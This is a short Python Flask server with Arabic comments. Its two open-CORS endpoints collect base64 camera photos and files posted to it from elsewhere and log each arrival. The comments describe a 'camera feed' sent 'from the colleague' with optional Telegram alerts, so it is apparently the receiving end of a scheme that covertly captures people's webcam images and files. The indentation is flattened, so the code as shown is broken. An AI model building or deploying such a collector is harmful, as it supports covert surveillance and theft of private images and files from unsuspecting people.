import time
import requests
import json
from flask import Flask, request, jsonify
from flask_cors import CORS

# إعداد الموقع والمنفذ
app = Flask(__name__)
CORS(app)

# --- قاعدة البيانات الخاصة بك ---
my_camera_feed = []
my_photo_files = []

# --- Route لاستقبال الصور من الزميل ---
@app.route('/receive_photo', methods=['POST'])
def receive_photo():
 try:
 data = request.json
 if 'image' in data:
 # حفظ الصورة في قائمتك
 my_camera_feed.append(data['image'])
 print(f"[+] New Photo Received! Total: {len(my_camera_feed)}")
 
 # إرسال إشعار لتليجرام (اختياري)
 # send_telegram_notification(data['image'])
 
 return jsonify({"status": "ok", "count": len(my_camera_feed)})
 except Exception as e:
 print(f"[-] Error: {e}")
 return jsonify({"status": "error"})

# --- Route لاستقبال الملفات ---
@app.route('/receive_file', methods=['POST'])
def receive_file():
 try:
 data = request.json
 if 'file' in data:
 my_photo_files.append(data['file'])
 print(f"[+] New File Received!")
 return jsonify({"status": "ok"})
 except:
 pass
 return jsonify({"status": "error"})

if __name__ == '__main__':
 print("Server Started. Waiting for images...")
 app.run(host='0.0.0.0', port=5000)
 